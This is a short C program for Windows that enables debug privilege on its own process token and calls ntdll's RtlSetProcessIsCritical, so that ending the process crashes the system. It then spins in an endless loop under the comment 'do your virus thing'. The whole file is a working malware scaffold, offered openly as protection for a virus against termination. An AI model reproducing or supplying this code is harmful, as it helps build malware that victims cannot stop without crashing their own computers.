#include <windows.h>
#include <stdio.h>
 
typedef VOID ( _stdcall *RtlSetProcessIsCritical ) (
               IN BOOLEAN        NewValue,
               OUT PBOOLEAN OldValue, 
               IN BOOLEAN     IsWinlogon );
 
BOOL EnablePriv(LPCSTR lpszPriv) 
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
     
    if(!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;
     
    if(!LookupPrivilegeValue(NULL, lpszPriv, &luid)){
        CloseHandle(hToken); return FALSE;
    }
     
    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
     
    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}
 
BOOL ProtectProcess() 
{
   HANDLE hDLL;
   RtlSetProcessIsCritical fSetCritical;
 
   hDLL = LoadLibraryA("ntdll.dll");
   if ( hDLL != NULL )
   {
    EnablePriv(SE_DEBUG_NAME);
        (fSetCritical) = (RtlSetProcessIsCritical) GetProcAddress( (HINSTANCE)hDLL, "RtlSetProcessIsCritical" );
          if(!fSetCritical) return 0;
          fSetCritical(1,0,0);
    return 1;
   } else
          return 0;
}
 
int main (void)
{
ProtectProcess();
   while(1)
   {
    // do your virus thing
   }
return 0;
}
